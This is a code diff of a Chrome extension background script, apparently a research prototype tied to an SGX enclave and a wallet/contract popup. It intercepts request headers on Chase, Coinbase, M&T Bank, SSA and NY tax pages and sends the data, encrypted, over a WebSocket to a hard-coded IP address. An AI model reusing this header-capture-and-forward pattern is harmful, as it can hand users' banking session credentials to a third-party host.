@@ -84,15 +84,13 @@ async function aesEnc(key, msg) {
  
   // Encrypt message by AEC-GCM-256
   var iv = crypto.getRandomValues(new Uint8Array(32));
-	encoder = new TextEncoder('utf-8');
-  encodedString = encoder.encode(msg);
   var encrypted = await crypto.subtle.encrypt(
     {
       name: "AES-GCM",
       iv: iv
     },
     symKey,
-    encodedString
+    msg
   );
   var encrypted = new Uint8Array(encrypted);
   
@@ -115,16 +113,51 @@ try {
 }
 */
 
+function encryptAndSend(msg) {
+  var ws = new WebSocket(addr);
+  ws.onopen = function(evt) {
+    encrypted = aesEnc(sgx_pk, msg).then(encrypted => {
+      console.log(encrypted);
+      ws.send(encrypted);
+      ws.close();
+    });
+  };
+
+  ws.onmessage = function(evt) {
+    console.log( "Received Message: " + evt.data);
+    ws.close();
+  };
+
+  ws.onclose = function(evt) {
+    console.log("Connection closed.");
+  };
+}
+
+function removePrefix(str) {
+  if (str.substring(0, 2) === "0x") {
+    return str.substring(2);
+  } else {
+    return str;
+  }
+}
 
 const addr = 'ws://128.84.84.208:9001'
 const host = '128.84.84.208'
 const port = 9001
 
-// const sgx_pk = 'BLtIrjcmxXNzRKVLNGP+xJnLEIp9EboTe6PH0EO9bX4UmU9gRio/kVUHSbsq5UEfIrf5vueZVqRjwwitUI81V98=' 
 const sgx_pk = 'BBarzLnfkPo3nLmRjT82ifMm8sbQpQSqavgD9omSAkorhxG+/8C7OqVKduXw2SZmBKYQYTNyqt6DwU4XSy6hkTw='
 
 
-const tabStorage = {};
+
+const source_dict = {
+    "https://secure.ssa.gov/OSSS/xml/down": 12,
+    "https://accounts.coinbase.com/api/v1": 13,
+    "https://onlinebanking.mtb.com/Accoun": 14,
+    "https://secure01b.chase.com/svc/rr/p": 15,
+    "https://api.spotify.com/v1/playlists": 16,
+    "https://otc.tax.ny.gov/webapp/wcs/st": 17,
+}
+
 const networkFilters = {
   urls: [
     "https://accounts.coinbase.com/api/v1/user",
@@ -147,28 +180,18 @@ chrome.webRequest.onSendHeaders.addListener((details) => {
       }
     }
   }
-
-
-
-  var ws = new WebSocket(addr);
-  ws.onopen = function(evt) {
-    console.log("Preparing ");
-    chrome.tabs.create({url:"hello.html"});
-    encrypted = aesEnc(sgx_pk, data).then(encrypted => {
-      console.log(encrypted);
-      ws.send(encrypted);
-      ws.close();
+  source = source_dict[data.substring(0, 36)]
+  
+  chrome.tabs.create({url:"popup.html"}, function(tab) {
+    console.log(tab.id);
+    chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+      contract = removePrefix(request.contract);
+      wallet = removePrefix(request.wallet);
+      console.log(contract);
+      console.log(wallet);
+	    encoder = new TextEncoder('utf-8');
+      encodedMsg = new Uint8Array([source, ...encoder.encode(data)]);
+      encryptAndSend(encodedMsg);
     });
-  };
-
-  ws.onmessage = function(evt) {
-    console.log( "Received Message: " + evt.data);
-    ws.close();
-  };
-
-  ws.onclose = function(evt) {
-    console.log("Connection closed.");
-  };
-
-//sendRequest(details.url);
+  });
 }, networkFilters, ["requestHeaders", "extraHeaders"]);
